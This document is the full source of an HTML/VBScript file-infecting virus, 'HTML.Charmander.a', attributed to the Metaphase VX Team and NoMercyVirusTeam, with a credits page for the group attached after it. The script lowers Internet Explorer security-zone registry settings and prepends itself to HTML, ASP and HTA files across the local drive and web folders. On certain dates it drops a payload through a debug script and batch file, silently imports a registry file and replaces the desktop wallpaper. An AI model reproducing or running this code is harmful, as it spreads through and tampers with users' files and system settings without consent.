<!--Charmander-->
<HTML>
<BODY>
<SCRIPT Language = "JavaScript">
<!--
	var userAgent=navigator.appName;
	var agentInfo=userAgent.substring(0, 1);
    if(agentInfo == "M"){
}
else {
alert("The page you want to view was designed for Internet Explorer only, \n Please view this page with Internet Explorer")
self.close()
}
//-->
</SCRIPT>

<Script Language = "VBScript">
<!--
On Error Resume Next
'HTML.Charmander.a
'By -KD- [Metaphase VX Team & NoMercyVirusTeam]
'Technology used from foxz [NoMercyVirusTeam]
'Part of the HTML Pokemon Family
'This Family goes out to IDT
Set WshShell = CreateObject("WScript.Shell")
WshShell.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1201", 0, "REG_DWORD"
WshShell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1201", 0, "REG_DWORD"
If location.protocol = "file:" then
  Randomize
  Set TRange = document.body.createTextRange()
  HPath = Replace(location.href, "/", "\")
  Set FSO = CreateObject("Scripting.FileSystemObject")
  HPath = Replace(HPath, "file:\\\", "")
  HPath = FSO.GetParentFolderName(HPath)
  Call GetFolder(HPath)
  Call GetFolder("C:\")
  Call GetFolder("C:\My Documents")
  Call GetFolder("C:\Windows")
  Call GetFolder("C:\Windows\System")
  Call GetFolder("C:\Windows\ShellNew")
  Call GetFolder("C:\Windows\Help")
  Call GetFolder("C:\Windows\Temp")
  Call GetFolder("C:\Windows\Web")
  Call GetFolder("C:\Windows\Web\Wallpaper")
  Call GetFolder("C:\Program Files\Microsoft Office\Office\Headers")
  Call GetFolder("C:\Inetpub\wwwroot")
  Call GetFolder("C:\Inetpub\wwwroot\myweb")
  Call GetFolder("C:\Program Files\Internet Explorer\Connection Wizard")
  Call GetFolder("C:\Program Files\Microsoft FrontPage\bin")	
End If
If Day(Now()) = 5 or Day(Now()) = 15 or Day(Now()) = 20  Then
  Set DropCharmander = FSO.CreateTextFile("c:\Windows\pokemon.dll", 2, False)
  DropCharmander.WriteLine "n Charman.jpg"
  DropCharmander.WriteLine "e 0100 ff d8 ff e0 00 10 4a 46 49 46 00 01 01 01 00 48 "
  DropCharmander.WriteLine "e 0110 00 48 00 00 ff db 00 43 00 0f 0a 0b 0d 0b 09 0f "
  DropCharmander.WriteLine "e 0120 0d 0c 0d 11 10 0f 11 16 25 18 16 14 14 16 2d 20 "
  DropCharmander.WriteLine "e 0130 22 1b 25 35 2f 38 37 34 2f 34 33 3b 42 55 48 3b "
  DropCharmander.WriteLine "e 0140 3f 50 3f 33 34 4a 64 4b 50 57 5a 5f 60 5f 39 47 "
  DropCharmander.WriteLine "e 0150 68 6f 67 5c 6e 55 5d 5f 5b ff db 00 43 01 10 11 "
  DropCharmander.WriteLine "e 0160 11 16 13 16 2b 18 18 2b 5b 3d 34 3d 5b 5b 5b 5b "
  DropCharmander.WriteLine "e 0170 5b 5b 5b 5b 5b 5b 5b 5b 5b 5b 5b 5b 5b 5b 5b 5b "
  DropCharmander.WriteLine "e 0180 5b 5b 5b 5b 5b 5b 5b 5b 5b 5b 5b 5b 5b 5b 5b 5b "
  DropCharmander.WriteLine "e 0190 5b 5b 5b 5b 5b 5b 5b 5b 5b 5b 5b 5b 5b 5b ff c0 "
  DropCharmander.WriteLine "e 01a0 00 11 08 00 60 00 6c 03 01 22 00 02 11 01 03 11 "
  DropCharmander.WriteLine "e 01b0 01 ff c4 00 1a 00 00 02 03 01 01 00 00 00 00 00 "
  DropCharmander.WriteLine "e 01c0 00 00 00 00 00 00 04 05 02 03 06 01 00 ff c4 00 "
  DropCharmander.WriteLine "e 01d0 30 10 00 02 01 03 03 03 04 01 03 02 07 00 00 00 "
  DropCharmander.WriteLine "e 01e0 00 00 01 02 03 00 04 11 12 21 31 05 41 51 13 22 "
  DropCharmander.WriteLine "e 01f0 61 71 14 06 23 a1 32 81 24 33 42 52 62 91 92 ff "
  DropCharmander.WriteLine "e 0200 c4 00 19 01 00 03 01 01 01 00 00 00 00 00 00 00 "
  DropCharmander.WriteLine "e 0210 00 00 00 00 02 03 04 00 01 05 ff c4 00 1f 11 00 "
  DropCharmander.WriteLine "e 0220 03 01 01 00 03 01 01 01 01 00 00 00 00 00 00 00 "
  DropCharmander.WriteLine "e 0230 01 02 11 03 12 21 31 32 22 04 13 ff da 00 0c 03 "
  DropCharmander.WriteLine "e 0240 01 00 02 11 03 11 00 3f 00 cc 81 be e2 af 8e 39 "
  DropCharmander.WriteLine "e 0250 2e 0e 88 90 b1 f8 a8 85 f9 c5 3e e8 71 21 81 99 "
  DropCharmander.WriteLine "e 0260 79 5f ea 39 a9 6d f8 ad 29 e7 3e 55 82 e1 d2 6f "
  DropCharmander.WriteLine "e 0270 55 33 e9 af fe a8 39 16 48 98 ab a9 53 5b 03 c5 "
  DropCharmander.WriteLine "e 0280 23 eb 48 ab 16 b2 06 33 8f aa 9e 3b 55 56 15 74 "
  DropCharmander.WriteLine "e 0290 e1 33 3a 85 1c 6f 8d eb da 7b d7 b9 a2 6d ac 27 "
  DropCharmander.WriteLine "e 02a0 b8 ff 00 2d 70 a7 fd 47 8a a9 b4 96 b2 44 9b f4 "
  DropCharmander.WriteLine "e 02b0 81 8f c0 da b9 b7 8d a9 8c 9d 16 e5 54 b6 a4 6c "
  DropCharmander.WriteLine "e 02c0 76 19 a0 5e 26 89 8a c8 0a 91 42 aa 5f c6 76 a2 "
  DropCharmander.WriteLine "e 02d0 a7 ea 22 47 fd 57 06 33 5c ef 53 8e 45 88 ab 31 "
  DropCharmander.WriteLine "e 02e0 d8 11 9a 20 03 ac fa 54 b7 23 51 21 17 f9 35 3b "
  DropCharmander.WriteLine "e 02f0 be 8f 2c 0b ad 1b 5a 8e 47 7a 7b 6e a1 57 00 83 "
  DropCharmander.WriteLine "e 0300 8e e3 bd 4e 40 18 60 d4 75 da 95 61 7c 70 87 3a "
  DropCharmander.WriteLine "e 0310 63 b2 01 c9 07 6e d5 a2 b1 8a 33 6a 84 26 c7 cd "
  DropCharmander.WriteLine "e 0320 25 bc f4 9a fa 58 c3 0d 21 88 3b 53 8b 46 8a 2b "
  DropCharmander.WriteLine "e 0330 75 44 23 00 79 a7 74 af e5 68 8e 53 94 c4 24 36 "
  DropCharmander.WriteLine "e 0340 47 04 53 9e 89 04 b0 bc ce 5b f6 e5 c1 0b e0 d2 "
  DropCharmander.WriteLine "e 0350 82 c5 4f 18 a3 ad fa ab 46 34 b8 03 03 b7 7a 67 "
  DropCharmander.WriteLine "e 0360 5f 2f 1f 40 71 cf 2f 66 80 91 e6 92 f5 b8 5a e2 "
  DropCharmander.WriteLine "e 0370 1d 2a c4 60 ea db bd 75 ba a0 2b 9c 1a 11 67 b9 "
  DropCharmander.WriteLine "e 0380 ea 17 22 de d9 72 ef b7 d0 f3 51 c4 54 bd 2d e9 "
  DropCharmander.WriteLine "e 0390 d2 6a 70 1a d2 20 f7 01 64 00 28 e6 b5 16 d1 84 "
  DropCharmander.WriteLine "e 03a0 41 8d 87 8a cb ce 1e c6 60 ce 4b fa 53 29 62 a3 "
  DropCharmander.WriteLine "e 03b0 c1 ad 62 4b ea 8d 7f ee 19 e3 14 ee fe e3 74 4f "
  DropCharmander.WriteLine "e 03c0 f9 f1 56 61 d6 dd 4d 27 ea b0 23 46 ce 47 f4 f7 "
  DropCharmander.WriteLine "e 03d0 f1 4e 4f 06 93 f5 e9 4a 74 c9 d5 54 b1 60 17 6e "
  DropCharmander.WriteLine "e 03e0 db d4 dc bf 48 a7 b7 e0 47 8d b1 c8 ab 20 b7 17 "
  DropCharmander.WriteLine "e 03f0 19 8f 6c 1c 66 ab 0d 84 19 00 12 2b d1 19 35 8f "
  DropCharmander.WriteLine "e 0400 4f 39 3e 2b d2 69 a4 79 49 ad 35 96 da 63 8d 54 "
  DropCharmander.WriteLine "e 0410 1d 80 c5 4e 47 04 6c 47 d5 67 97 a8 4f 06 16 54 "
  DropCharmander.WriteLine "e 0420 61 e3 22 a4 fd 4d e4 3a 63 05 8f 85 19 35 05 73 "
  DropCharmander.WriteLine "e 0430 6d e9 e9 4f 44 96 15 5c 74 e6 fc 86 11 9d 9d 8b "
  DropCharmander.WriteLine "e 0440 1a b5 7a 55 d0 1e c7 52 3e aa d0 92 c3 73 0a bb "
  DropCharmander.WriteLine "e 0450 86 92 70 0e 33 9d 23 e6 b5 76 b0 a2 c0 a0 62 98 "
  DropCharmander.WriteLine "e 0460 ea b0 9f 25 3d 31 10 db 9b 99 40 8c 64 9e fe 29 "
  DropCharmander.WriteLine "e 0470 ed a7 4f 84 01 00 55 76 3f d5 9a 52 b7 f0 db ae "
  DropCharmander.WriteLine "e 0480 9b 54 c3 70 58 d3 ef d3 67 52 34 b2 1c b3 1e 68 "
  DropCharmander.WriteLine "e 0490 fa d5 3f 9f 0e 72 53 2b 5f d2 e6 fd 39 65 e9 92 "
  DropCharmander.WriteLine "e 04a0 f0 a6 af 81 4a 6e 6c d6 c6 41 a7 f6 fc 32 6d 8a "
  DropCharmander.WriteLine "e 04b0 d8 49 83 1d 67 ba d0 53 0b e3 90 36 a4 a4 f0 ce "
  DropCharmander.WriteLine "e 04c0 fd fb 12 c5 64 8f 39 d4 75 0c e4 e7 bd 3b 88 aa "
  DropCharmander.WriteLine "e 04d0 81 db 6a cc 2c f7 0a e1 86 fd b0 28 c8 ba 9b e7 "
  DropCharmander.WriteLine "e 04e0 4b 29 c8 e4 51 5c 53 5e c6 73 b8 4f 47 c6 45 c7 "
  DropCharmander.WriteLine "e 04f0 34 05 e2 a4 c8 ca 77 52 37 a0 e4 ea 63 4e dc fd "
  DropCharmander.WriteLine "e 0500 d0 92 dd cb 36 46 74 81 de 97 3c d8 db ea 9a 29 "
  DropCharmander.WriteLine "e 0510 92 dc 99 4a 46 72 07 f1 4d 2c ad a1 b5 8d 40 3a "
  DropCharmander.WriteLine "e 0520 a5 7e 49 a5 22 e2 68 83 08 9f 66 e4 e3 9a 33 a3 "
  DropCharmander.WriteLine "e 0530 36 bb e5 32 67 23 cd 55 4a dc 92 4d 42 ad 46 b2 "
  DropCharmander.WriteLine "e 0540 ca c1 0a 06 95 43 1f 06 ab ea 36 28 88 64 8d 40 "
  DropCharmander.WriteLine "e 0550 c7 2a 05 30 b4 70 52 ab bd 75 0a 7c 54 ce 58 5f "
  DropCharmander.WriteLine "e 0560 f4 f6 65 ff 00 19 1e 71 71 1b 95 65 d8 8e 73 4e "
  DropCharmander.WriteLine "e 0570 ad ee c0 85 6b 3e f1 5d b4 f2 c9 6d a5 90 1d c1 "
  DropCharmander.WriteLine "e 0580 35 52 f5 37 03 1e 9e 31 db 34 c4 9b 0a b1 fb 03 "
  DropCharmander.WriteLine "e 0590 81 11 e5 0a 01 3a 8f 7a d2 f4 c5 6b 35 c1 20 8e "
  DropCharmander.WriteLine "e 05a0 46 2b 3b 0f b1 86 9e 41 da 8d 93 ab 38 d2 be 9b "
  DropCharmander.WriteLine "e 05b0 02 39 da 9d d9 3f 88 4f 1f 1c 7a 6a 9a ef f6 b9 "
  DropCharmander.WriteLine "e 05c0 3b 8a 45 d5 e6 69 10 a2 02 59 b8 c5 52 dd 47 28 "
  DropCharmander.WriteLine "e 05d0 3d f8 da a0 f7 56 c8 04 86 50 d2 0e d4 af 69 60 "
  DropCharmander.WriteLine "e 05e0 4a 74 b2 c7 a7 ad bc 62 59 b7 90 ff 00 14 ce 2e "
  DropCharmander.WriteLine "e 05f0 97 1d ea e6 58 94 8f 24 6f 4a ad 2e 9e fa ed 17 "
  DropCharmander.WriteLine "e 0600 84 ce 7e eb 5f 68 a1 50 00 29 75 e5 f5 8e f2 99 "
  DropCharmander.WriteLine "e 0610 59 22 89 3f 4e 59 47 1f b2 31 ab fe 5b 8a 59 3d "
  DropCharmander.WriteLine "e 0620 b2 44 de 9b c6 14 7d 6d 5a d9 57 6a 43 d6 63 0d "
  DropCharmander.WriteLine "e 0630 19 23 91 bd 71 68 0a cc fd cd 97 a2 35 a0 ca d1 "
  DropCharmander.WriteLine "e 0640 7d 3e 08 4c 22 50 3d e3 be 68 41 7e 0a 7a 52 8c "
  DropCharmander.WriteLine "e 0650 0e 33 5e 0b 97 58 ed 2e 94 64 64 a9 6c 53 9b af "
  DropCharmander.WriteLine "e 0660 1c 66 4a 7c b5 1a 5b 6b cc 20 aa 6f ef 3f 68 ff "
  DropCharmander.WriteLine "e 0670 00 02 90 47 7a f1 82 ae d9 23 93 e6 b8 2f d4 c8 "
  DropCharmander.WriteLine "e 0680 1a 5d 45 41 db 03 6a de 34 90 bf 5e 45 92 5d 5f "
  DropCharmander.WriteLine "e 0690 59 c0 d0 2b 01 1c a7 53 0d 34 b8 96 27 24 6f 57 "
  DropCharmander.WriteLine "e 06a0 5f de fa d3 65 72 17 b5 0e 19 88 ce 4d 51 cd 7f "
  DropCharmander.WriteLine "e 06b0 3a d0 be 9f ac 43 0b 38 02 5c 46 d3 48 a0 03 92 "
  DropCharmander.WriteLine "e 06c0 49 e2 9a 75 69 ed 56 d8 7e 2c c9 2b b0 19 d2 bc "
  DropCharmander.WriteLine "e 06d0 56 7e 59 1c b6 06 6b ab ea 30 c6 31 47 50 ab e8 "
  DropCharmander.WriteLine "e 06e0 11 d1 c7 c2 dd 3a a3 f7 60 51 7d 1a ca da eb 58 "
  DropCharmander.WriteLine "e 06f0 95 43 b6 70 32 d8 02 96 c9 91 b1 a8 aa ae 72 41 "
  DropCharmander.WriteLine "e 0700 db e6 b5 42 6b 0e cd b5 5a 3e 58 96 c3 ab 7a 6a "
  DropCharmander.WriteLine "e 0710 a1 42 ed b1 cd 69 ad 26 f6 8c 9a cf 58 88 da d5 "
  DropCharmander.WriteLine "e 0720 5b 00 ed 47 5b dc 05 18 07 8a 81 bf 78 57 52 dc "
  DropCharmander.WriteLine "e 0730 a6 39 9e 61 a3 63 59 fe b1 36 98 5f ea 89 9a eb "
  DropCharmander.WriteLine "e 0740 6e 69 45 d7 f8 bb 95 87 7c 13 92 47 8a 36 d3 12 "
  DropCharmander.WriteLine "e 0750 93 d1 42 b1 39 d4 a0 8f 9a 26 0e a1 1c 16 ad 00 "
  DropCharmander.WriteLine "e 0760 b4 87 25 89 57 c7 b8 67 e6 aa bd d1 14 c5 14 6d "
  DropCharmander.WriteLine "e 0770 42 94 d4 db 55 71 95 28 55 ec 51 64 87 2a 49 19 "
  DropCharmander.WriteLine "e 0780 f9 a3 7a 2c d0 2c 8e b7 06 35 53 dd f8 a1 62 05 "
  DropCharmander.WriteLine "e 0790 36 35 c9 55 49 c8 5a 2a 94 d6 03 36 e5 e8 77 5b "
  DropCharmander.WriteLine "e 07a0 48 bd 71 f8 ef 14 91 e3 98 f8 a5 07 19 e7 14 54 "
  DropCharmander.WriteLine "e 07b0 5e de 78 a8 3a c4 5b 8a ec ca 95 88 d5 4e 9e b3 "
  DropCharmander.WriteLine "e 07c0 cc 58 37 b8 d1 01 89 8f 63 50 97 1f 15 24 62 63 "
  DropCharmander.WriteLine "e 07d0 23 14 40 94 8c 33 90 4d 48 c4 58 ec 76 aa 58 91 "
  DropCharmander.WriteLine "e 07e0 26 2a f4 7f 7a ae 40 d5 b6 49 e2 b1 82 96 0b f8 "
  DropCharmander.WriteLine "e 07f0 a3 02 20 4a 9f 15 c8 ee 66 b6 7d 33 b7 ba b4 51 "
  DropCharmander.WriteLine "e 0800 fe 18 e9 c8 56 fe 2f 5b 8d 1a 85 66 a7 61 25 c3 "
  DropCharmander.WriteLine "e 0810 33 80 7f bd 48 a2 9d 6b 5e 8a dd cf 86 26 4e 5b "
  DropCharmander.WriteLine "e 0820 fc ec 0e 6b 90 df 08 09 66 47 2c df 15 53 98 86 "
  DropCharmander.WriteLine "e 0830 34 a8 cf 9a 79 d2 62 5b ab 78 d1 62 47 73 b0 27 "
  DropCharmander.WriteLine "e 0840 03 7f ba ef 4e 6a 67 d7 b0 79 57 95 7b f4 66 ae "
  DropCharmander.WriteLine "e 0850 1e 59 a7 66 23 19 35 38 ed df 1c d1 bd 65 1a 1b "
  DropCharmander.WriteLine "e 0860 e6 56 40 a4 6d cd 0a b3 61 48 ef 4e e7 f9 48 57 "
  DropCharmander.WriteLine "e 0870 5f d7 dd 3c 32 a3 0d bd 74 0d 43 20 d0 af 24 9a "
  DropCharmander.WriteLine "e 0880 be 2a c8 9c ff 00 7a 60 a2 e6 38 4c 62 85 62 73 "
  DropCharmander.WriteLine "e 0890 45 6c 7e ea 05 01 39 c5 63 a7 ff d9 "
  DropCharmander.WriteLine "RCX"
  DropCharmander.WriteLine "079c"
  DropCharmander.WriteLine "W"
  DropCharmander.WriteLine "Q"
  DropCharmander.Close
  Set MyBat = FSO.CreateTextFile("c:\Windows\WinStart.bat", 2, False)
  MyBat.WriteLine ""
  MyBat.WriteLine "@echo off"
  MyBat.WriteLine "debug < c:\Windows\pokemon.dll > nul"
  MyBat.WriteLine ""
  MyBat.Close
  Set MyReg = FSO.CreateTextFile("c:\Windows\pokemon.reg", 2, False)
  MyReg.WriteLine "REGEDIT4"
  MyReg.WriteLine ""
  MyReg.WriteLine "[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer]"
  MyReg.WriteLine chr(34) & "ShellState" & chr(34) & "=hex:1c,00,00,00,e3,08,00,00,00,00,00,00,00,00,00,00,00,00,00,00,01,00,00,00,0a,00,00,00"
  MyReg.WriteLine ""
  WshShell.Run("regedit /s c:\Windows\pokemon.reg"), VbHide
  WshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Desktop\General\Wallpaper", "C:\Windows\Charman.jpg" 
  WshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Desktop\General\BackupWallpaper", "C:\Windows\Charman.jpg" 
  WshShell.RegWrite "HKEY_CURRENT_USER\Control Panel\desktop\TileWallpaper", "1"
  WshShell.RegWrite "HKEY_CURRENT_USER\Control Panel\desktop\Wallpaper", "C:\Windows\Charman.jpg" 
End If

Sub GetFolder(InfPath)
On Error Resume Next
Randomize
If FSO.FolderExists(InfPath) Then
  Do
  Set FolderObj = FSO.GetFolder(InfPath)
  InfPath = FSO.GetParentFolderName(InfPath)
  Set FO = FolderObj.Files
  For each NewFile in FO
  ExtName = Lcase(FSO.GetExtensionName(NewFile.Name))
  If ExtName = "htt" Or ExtName = "asp" Or ExtName = "htm" Or ExtName = "hta" _
 Or ExtName = "htx" Or ExtName = "html" Then
    Set MyCharmander = FSO.GetFile(NewFile.path)
    Set Charmander = MyCharmander.OpenAsTextStream(1)
    CharmanderCheck = Charmander.readline
    Charmander.close()
      If CharmanderCheck <> "<!--Charmander-->" then
      InfectFile NewFile.path
      End If
  End If
  Next
  Loop While FolderObj.IsRootFolder = False
End If
End Sub

Sub InfectFile(GetFileName)
On Error Resue Next
Randomize
Set MyCharmander = FSO.GetFile(GetFileName)
Set Charmander = MyCharmander.OpenAsTextStream(1)
FileContents = Charmander.ReadAll()
Charmander.Close
Set MyCharmander = FSO.GetFile(GetFileName)
Set Charmander = MyCharmander.OpenAsTextStream(2)
Charmander.WriteLine "<!--Charmander-->"
Charmander.WriteLine "<html><body>"
Charmander.WriteLine(TRange.htmlText)
Charmander.Write("</body></html>" + Chr(13) + Chr(10))
Charmander.Write FileContents
Charmander.Close
End Sub
-->
</SCRIPT>
</BODY>
</HTML>
<HTML>
<HEAD>
<META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=windows-1252">
<TITLE>Metaphase VX Team</TITLE>
<STYLE TYPE="text/css">
.namelist {
	font-family : Times New Roman;
	color		: #ffffe0;
	font-size	: 18;
};
.thx {
	color		: #ffffe0;
	font-size	: 24;
	text-align	: center;
}
</STYLE>

<SCRIPT LANGUAGE=JavaScript>
var names = new Array (
'Knowdeth','Knowdeth',
'Sinixstar','Sinixstar',
'Demonphreak_','Demonphreak_',
'Sblip','Sblip',
'Raven','Raven',
'nucleii','nucleii',
'jackie','jackie',
'Evul','Evul',
'MetalKid','MetalKid',
'VxFaerie','VxFaerie',
'Lys Kovick','Lys Kovick',
'','',
'','',
'','',
'','',
'','',
'Specal Thanks To All The Beta Testers','BETA',
'and many many more...','',
'<BR><BR><BR>Welcome To<BR>A Member Of<BR>The<BR>HTML Pokemon<BR>Family<BR>By -KD-<BR>Metaphase <BR>&<BR> NoMercy<BR><BR>2000<BR>','thx0'
);

var namesIndex = 0;
var namesIndexOrg;

var pics = new Array (
	'c_place.jpg',	'1',
	'bld27.jpg',	'2',
	'brick.jpg',	'1',
	'welcome.jpg',	'2',
	'bld1678.jpg',	'1',
	'cd.jpg',		'2',
	'emp1.jpg',		'1',
	'emp3.jpg',		'2',
	'rtm1.jpg',		'1',
	'bus.jpg',		'2',
	'c_bike.jpg',	'3',
	'c_ftn1.jpg',	'1',
	'c_ftn3.jpg',	'2',
	'c_ftn4.jpg',	'1',
	'c_bird3.jpg',	'2',
	'c_bird2.jpg',	'3',
	'c_lake1.jpg',	'1',
	'c_lake2.jpg',	'2',
	'c_cafe.jpg',	'3',
	'c_recep.jpg',	'1',
	'c_sport.jpg',	'2',
	'hammer2.jpg',	'1',
	'piers.jpg',	'2',
	'kingdom.jpg',	'1',
	'needle.jpg',	'3',
	'sea-bld1.jpg',	'1',
	'sea-bld3.jpg',	'2',
	'train.jpg',	'1',
	'water2.jpg',	'3',
	'water1.jpg',	'1',
	'market.jpg',	'2'
);

var picsIndex = 0;

var creditsTimeout = 5500;
var picsTimeout = 2000;
var stopTimeout = 5000;

var nameCount = 21;
var nameX = document.all.name1;
var nameP = document.all.name2;

function showNames() {
	var nString = "";
	var i, j = names.length;
	var bEof = false;

	namesIndexOrg = -1;
	if (namefind.innerText != "") {
		for (i = 1; i < j; i += 2) {
			if (names[i] == namefind.innerText) {
				namesIndexOrg = namesIndex;
				namesIndex = i - 1;
				break;
			}
		}
	}

	for (i = 0; i < nameCount && namesIndex < j; 
				i++, namesIndex += 2) {
		if (names[namesIndex + 1] == 'thx0') {
			if (i)
				break;
			else
				bEof = true;
		}
		nString = nString + names[namesIndex] + "<BR>";
	}

	if (nameX == document.all.name2) {
		nameX = document.all.name1;
		nameP = document.all.name2;
	} else {
		nameX = document.all.name2;
		nameP = document.all.name1;
	}

	ShowHideObj(nameP, 0, 1);
	if (bEof)
		nameX = document.all.thxtext;
	nameX.innerHTML = nString;
	ShowHideObj(nameX, 1, 1);

	// restore the original index, if name jumped
	if (namesIndexOrg != -1) {
		namesIndex = namesIndexOrg;
		namefind.innerText = "";
	}		

	return (namesIndex < j);
};


function ShowHideObj(obj, bShowHide, bApply)
{
	var vis;

	vis = bShowHide == 1 ? "visible" : "hidden";

	if (screen.colorDepth >= 24)
		obj.style.visibility = vis;
	else {
		if (bApply == 1)
			obj.filters(0).apply();
		obj.style.visibility = vis;
		obj.filters(0).play();
	}
}

var imgX = document.all.img1;
var imgP = document.all.img2;
var prevImgType = '2';

function ShowPic() 
{
	switch (pics[picsIndex + 1]) {
	case '1':
		imgX = document.all.img1;
		break;
	case '2':
		imgX = document.all.img2;
		break;
	case '3':
		imgX = document.all.img3;
		break;
	}
	
	switch (prevImgType) {
	case '1':
		imgP = document.all.img1;
		break;
	case '2':
		imgP = document.all.img2;
		break;
	case '3':
		imgP = document.all.img3;
		break;
	}
	
	if (pics[picsIndex + 1] == '3') {
		ShowHideObj(frmLandscape, 0, 1);
		ShowHideObj(frmPortrait, 1, 1);
	}
	if (prevImgType == '3') {
		ShowHideObj(frmPortrait, 0, 1);
		ShowHideObj(frmLandscape, 1, 0);
	}

	prevImgType = pics[picsIndex + 1];
	
	ShowHideObj(imgP, 0, 1);
	imgX.innerHTML = "<IMG SRC=res://membg.dll/" + pics[picsIndex] + ">";
	ShowHideObj(imgX, 1, 1);
		
	picsIndex += 2;

	if (picsIndex >= pics.length)
		picsIndex = 0;
}


var bFullStop = false;

function credits()
{
	if (initxt.innerHTML != '') {
		initxt.innerHTML = '';
		ShowHideObj(initxt, 0, 1);
	}

	if (showNames())
		window.tm = setTimeout('credits();', creditsTimeout);
	else 
		window.tm = setTimeout('StopShow();', stopTimeout);
}


function StopShow()
{
	bFullStop = true;
	window.tm = setTimeout('closeProc();', 1);
}


function ShowImages() 
{
	if (frmLandscape.style.visibility == "hidden") 
		ShowHideObj(frmLandscape, 1, 1);

	ShowPic();

	if (bFullStop == false || (picsIndex < 1 || picsIndex > 4))
		window.tm = setTimeout('ShowImages();', picsTimeout);
}


function ShowNameImg()
{
	ShowHideObj(imgBkg, 1, 1);
	ShowHideObj(crd, 1, 1);

	document.all.initxt.innerHTML = 'The Metaphase VX Team<BR><BR>This list represents but a portion<BR>of the key people. through out the years.<BR><BR><BR><BR><BR><B>From Old School To New</B>'

	ShowHideObj(initxt, 1, 1);

	window.tm = setTimeout('ShowImages();', picsTimeout);
	window.tm = setTimeout('credits();', 8000);
}


function intro() 
{
	if (ShowNum())
		window.tm = setTimeout('intro();', 100);
	else {
		winnum.style.visibility = "hidden";
		ShowNameImg();
	}
}

var WinVerList = new Array (
	'&#139;&#139;',
	'&#140;&#139;',
	'&#140;&#141;',
	'&#142;&#141;',
	'&#142;&#143;',
	'&#144;&#143;',
	'&#144;&#145;',
	'&#146;&#145;',
	'&#148;&#147;',
	'&#137;&#136;',
	'&#148;&#147;',
	'&#137;&#136;',
	'&#148;&#147;'
);

var numIdx = 0;

function ShowNum() 
{
//useless section
};

</SCRIPT>

<script language=vbs>
dim strEmp : strEmp = ""
Sub keydownx()
	keyCode = window.event.keycode
	
	select case keyCode
	case 13
		namefind.innerText = strEmp
		strEmp = ""
	case 27
		strEmp = ""
	case else
		if (keyCode <= 255 AND keyCode >= 32) then
			strEmp = strEmp & chr(keyCode)
		end if
	end select
End sub

Sub closeProc()
	ON ERROR RESUME NEXT
End Sub
</script>

</HEAD>

<BODY BGCOLOR="#000000" ONLOAD="intro()" ONKEYDOWN="keydownx()">

<IMG id=imgBkg SRC="res://membg.dll/backgnd.gif" ALIGN="CENTER" VALIGN="CENTER" 
style="position:absolute; left:0; top:0; 
filter:revealTrans(duration=2.0,transition=7; z-index:1; visibility:hidden">

<DIV ID=name1 class="namelist" ALIGN=LEFT VALIGN=TOP
style="position:absolute; left:83; top:22; z-index:90;
filter:blendTrans(duration=0.8); visibility:hidden">
</DIV>

<DIV ID=name2 class="namelist" ALIGN=LEFT VALIGN=TOP
style="position:absolute; left:83; top:22; z-index:90;
filter:blendTrans(duration=0.8); visibility:hidden">
</DIV>

<DIV ID=thxtext class="thx" VALIGN=TOP
style="position:absolute; left:83; top:22; z-index:90; width:180;
filter:blendTrans(duration=0.8); visibility:hidden">
</DIV>

<DIV ID=initxt class="thx" VALIGN=TOP
style="position:absolute; left:78; top:22; z-index:90; width:240; font-size:18;
filter:blendTrans(duration=0.8); visibility:hidden">
</DIV>

<IMG id=frmLandscape SRC="res://membg.dll/frame0.jpg" 
style="position:absolute; left:330;top:49; z-index:90;
filter:blendTrans(duration=0.50); visibility:hidden">

<IMG id=frmPortrait SRC="res://membg.dll/frame1.jpg" 
style="position:absolute; left:339;top:38; z-index:90;
filter:blendTrans(duration=0.50); visibility:hidden">

<IMG id=logo SRC="res://membg.dll/logo.gif" 
style="position:absolute; left:278;top:370; z-index:90;
filter:blendTrans(duration=2.00); visibility:hidden">

<IMG id=crd SRC="res://membg.dll/credit.gif" 
style="position:absolute; left:22;top:22; z-index:90;
filter:revealTrans(duration=1.0,transition=5); visibility:hidden">

<DIV id=img1
style="position:absolute; left:344;top:65; z-index:90;
filter:blendTrans(duration=1.00); visibility:hidden">
</DIV>

<DIV id=img2
style="position:absolute; left:344;top:65; z-index:90;
filter:blendTrans(duration=1.00); visibility:hidden">
</DIV>

<DIV id=img3
style="position:absolute; left:358;top:61; z-index:90;
filter:blendTrans(duration=1.00); visibility:hidden">
</DIV>

<DIV ID=namefind></DIV>	

<DIV id=winnum ALIGN="CENTER" style="position:absolute; left:20;top:100; 
font-family:wingdings; font-size:180; font-weight:bold; color:#0000ff;	
visibility=hidden"></DIV>

<OBJECT id="discwav" style = "visibility:hidden"
	classid="CLSID:05589FA1-C356-11CE-BF01-00AA0055595A">
	<PARAM NAME="ShowDisplay" VALUE="-1">
	<PARAM NAME="AutoStart" VALUE="1">
	<PARAM NAME="AutoRewind" VALUE="1">
	<PARAM NAME="PlayCount" VALUE="8">
	<PARAM NAME="FileName" VALUE="C:\WINDOWS\Application Data\Microsoft\WELCOME\welcom98.wav">

</OBJECT>
</BODY>
</HTML>